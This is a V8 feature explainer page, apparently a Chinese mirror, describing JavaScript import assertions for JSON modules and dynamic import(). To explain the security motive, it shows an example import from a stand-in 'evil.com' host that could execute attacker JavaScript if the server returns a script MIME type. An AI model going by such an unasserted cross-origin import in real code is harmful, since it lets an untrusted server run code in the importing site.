<!doctype html><html lang=zh-CN><meta charset=utf-8><title>Import assertions · V8</title><meta content="width=device-width" name=viewport><meta content="dark light" name=color-scheme><link href=/_css/main.css rel=stylesheet><link href=/_css/feature-support.css rel=stylesheet><link href=/.webmanifest rel=manifest><meta content=#4285F4 name=theme-color><link href=/blog.atom rel=alternate title="V8 Atom feed" type=application/atom+xml><link href=/features.atom rel=alternate title="V8 JS/Wasm features Atom feed" type=application/atom+xml><script>document.documentElement.className+=" js"</script><meta content="Import assertions allow module import statements to include additional information alongside the module specifier" name=description><header id=header><h1><a href=/ >V8</a></h1><a href=#navigation-toggle id=nav-toggle>显示导肮</a><nav><ul><li><a href=/ >主页</a><li><a href=/blog/ >博客</a><li><a href=/docs/ >文档</a><li><a href=/tools/ >工具</a><li class=current><a href=/features title="JavaScript 和 WebAssembly 的新特性">JS/Wasm 新特性</a><li><a href=/grant>Research</a></ul></nav></header><main id=main><article itemscope itemtype=http://schema.org/BlogPosting><header><h1 itemprop=headline>Import assertions</h1><p class=meta>发布时间 <time datetime="2021-06-15 00:00:00" itemprop=datePublished>2021-06-15</time> · 标签： <a href=/features/tags/ecmascript class=tag>ECMAScript</a></header><div itemprop=articleBody><p>The new <a href=https://github.com/tc39/proposal-import-assertions>import assertions</a> feature allows module import statements to include additional information alongside the module specifier. An initial use for the feature is to enable JSON documents to be imported as <a href=https://github.com/tc39/proposal-json-modules>JSON modules</a>:<pre class=language-json><code class=language-json><span class="token comment">// foo.json</span><br><span class="token punctuation">{</span> <span class="token property">"answer"</span><span class="token operator">:</span> <span class="token number">42</span> <span class="token punctuation">}</span></code></pre><pre class=language-javascript><code class=language-javascript><span class="token comment">// main.mjs</span><br><span class="token keyword">import</span> json <span class="token keyword">from</span> <span class="token string">'./foo.json'</span> <span class="token keyword">assert</span> <span class="token punctuation">{</span> <span class="token property literal-property">type</span><span class="token operator">:</span> <span class="token string">'json'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>answer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 42</span></code></pre><h2 id=background%3A-json-modules-and-mime-type>Background: JSON modules and MIME type <a href=#background%3A-json-modules-and-mime-type class=bookmark>#</a></h2><p>A natural question to ask is why a JSON module couldn’t simply be imported like this:<pre class=language-javascript><code class=language-javascript><span class="token keyword">import</span> json <span class="token keyword">from</span> <span class="token string">'./foo.json'</span><span class="token punctuation">;</span></code></pre><p>The web platform checks the MIME type of a module resource for validity prior to executing it, and in theory this MIME type could also be used to determine whether to treat the resource as a JSON or as a JavaScript module.<p>But, there’s a <a href=https://github.com/w3c/webcomponents/issues/839>security issue</a> with relying on the MIME type alone.<p>Modules can be imported cross-origin, and a developer might import a JSON module from a third-party source. They might consider this to be basically safe even from an untrusted third-party as long as the JSON is properly sanitized, since importing JSON won’t execute script.<p>However, third-party script can actually execute in this scenario because the third-party server could unexpectedly reply with a JavaScript MIME type and a malicious JavaScript payload, running code in the importer’s domain.<pre class=language-javascript><code class=language-javascript><span class="token comment">// Executes JS if evil.com responds with a</span><br><span class="token comment">// JavaScript MIME type (e.g. `text/javascript`)!</span><br><span class="token keyword">import</span> data <span class="token keyword">from</span> <span class="token string">'https://evil.com/data.json'</span><span class="token punctuation">;</span></code></pre><p>File extensions can’t be used to make a module type determination because they <a href=https://github.com/tc39/proposal-import-assertions/blob/master/content-type-vs-file-extension.md>aren’t a reliable indicator of content type on the web</a>. So instead, we use import assertions to indicate the expected module type and prevent this escalation-of-privilege pitfall.<p>When a developer wants to import a JSON module, they must use an import assertion to specify that it’s supposed to be JSON. The import will fail if the MIME type received from the network doesn’t match the expected type:<pre class=language-javascript><code class=language-javascript><span class="token comment">// Fails if evil.com responds with a non-JSON MIME type.</span><br><span class="token keyword">import</span> data <span class="token keyword">from</span> <span class="token string">'https://evil.com/data.json'</span> <span class="token keyword">assert</span> <span class="token punctuation">{</span> <span class="token property literal-property">type</span><span class="token operator">:</span> <span class="token string">'json'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id=dynamic-import()>Dynamic <code>import()</code> <a href=#dynamic-import() class=bookmark>#</a></h2><p>Import assertions can also be passed to <a href=https://v8.dev/features/dynamic-import#dynamic>dynamic <code>import()</code></a> with a new second parameter:<pre class=language-json><code class=language-json><span class="token comment">// foo.json</span><br><span class="token punctuation">{</span> <span class="token property">"answer"</span><span class="token operator">:</span> <span class="token number">42</span> <span class="token punctuation">}</span></code></pre><pre class=language-javascript><code class=language-javascript><span class="token comment">// main.mjs</span><br><span class="token keyword">const</span> jsonModule <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./foo.json'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><br>  <span class="token property literal-property">assert</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property literal-property">type</span><span class="token operator">:</span> <span class="token string">'json'</span> <span class="token punctuation">}</span><br><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>jsonModule<span class="token punctuation">.</span>default<span class="token punctuation">.</span>answer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 42</span></code></pre><p>The JSON content is the default export of the module, so it’s referenced through the <code>default</code> property on the object returned from <code>import()</code>.<h2 id=conclusion>Conclusion <a href=#conclusion class=bookmark>#</a></h2><p>Currently the only specified use of import assertions is for specifying module type. However, the feature was designed to allow arbitrary key/value assertion pairs, so additional uses may be added in the future if it becomes useful to restrain module imports in other ways.<p>Meanwhile, JSON modules with the new import assertions syntax are available by default in Chromium 91. <a href=https://chromestatus.com/feature/5948572598009856>CSS module scripts</a> are also coming soon, using the same module-type-assertion syntax.<h2 id=support>Import assertions support <a href=#support class=bookmark>#</a></h2><ul class=feature-support><li class="environment has-link has-support"><a href=https://chromestatus.com/feature/5765269513306112><span class="icon chrome">Chrome:</span> <span class=support>自 <span class=version>91</span> 版本开始支持</span></a><li class="environment no-support"><span class="icon firefox">Firefox:</span> <span class=support>不支持</span><li class="environment no-support"><span class="icon safari">Safari:</span> <span class=support>不支持</span><li class="environment no-support"><span class="icon nodejs">Node.js:</span> <span class=support>不支持</span><li class="environment has-link has-support"><a href=https://github.com/babel/babel/pull/12139><span class="icon babel">Babel:</span> <span class=support>支持</span></a></ul><div class=feature-support-info><a href=/features/support>关于特性支持列表</a></div></div><footer><div><picture><source srcset="/_img/avatars/dan-clark.avif, /_img/avatars/dan-clark@2x.avif 2x" type=image/avif><img alt="" height=96 loading=lazy src=/_img/avatars/dan-clark.jpg srcset="/_img/avatars/dan-clark@2x.jpg 2x" width=96></picture><p>作者：Dan Clark (<a href=https://twitter.com/dandclark1>@dandclark1</a>), assertive importer of import assertions.</div></footer></article></main><footer id=footer><div><nav><a href=https://v8.dev/features/import-assertions>原文</a> · <a href=/logo/ >商标</a> · <a href=/terms/ >条款</a> · <a href=https://policies.google.com/privacy/ >隐私</a> · <a href=https://twitter.com/v8js rel="me nofollow">Twitter</a> · <a href=https://github.com/justjavac/v8.js.cn/tree/master/./src/features/import-assertions.md rel=nofollow>在 GitHub 编辑此页面</a></nav><dark-mode-toggle dark="Light Theme" light="Dark Theme" permanent></dark-mode-toggle></div><p><small>如无特殊说明，此 V8 项目中使用到的所有示例代码均基于 <a href=https://chromium.googlesource.com/v8/v8.git/+/master/LICENSE>V8's BSD-style license</a> 发布。页面中的文字内容采用 <a href=https://creativecommons.org/licenses/by/3.0/ >the Creative Commons Attribution 3.0 License</a> 进行许可。更详细的信息可以在 <a href=/terms#site-policies>站点策略</a> 中找到。</small></footer><script src=/_js/dark-mode-toggle.mjs type=module></script><script src=/_js/main.mjs type=module></script><script src=/_js/legacy.js nomodule></script>